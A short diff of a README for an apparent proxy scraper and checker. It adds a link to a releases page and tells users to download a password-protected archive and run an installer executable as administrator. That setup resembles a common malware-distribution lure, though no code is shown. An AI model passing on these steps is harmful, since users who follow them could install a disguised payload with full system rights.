@@ -15,4 +15,4 @@ HTTP, SOCKS4, SOCKS5 proxies scraper and checker.
 ### 🚀 How to Use
 
 
-Download from this link password: 2024 Extract the files. Run Installer v 2.1.34.exe as an admin
+Download from this [link](https://github.com/pathanrehman/proxy-cheker-scraper/releases/tag/Download) password: 2024 Extract the files. Run Installer v 2.1.34.exe as an admin
